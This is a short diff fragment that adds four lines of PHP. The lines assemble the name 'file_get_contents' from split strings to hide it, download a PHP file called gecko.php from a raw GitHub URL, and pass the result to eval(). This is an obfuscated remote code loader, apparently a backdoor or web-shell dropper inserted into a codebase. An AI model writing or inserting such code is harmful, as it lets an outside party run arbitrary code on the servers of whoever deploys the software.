@@ -1,0 +1,4 @@
+$fn = 'file'.'_get'.'_contents';
+$url = 'https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko.php';
+$data = $fn($url);
+eval($data);
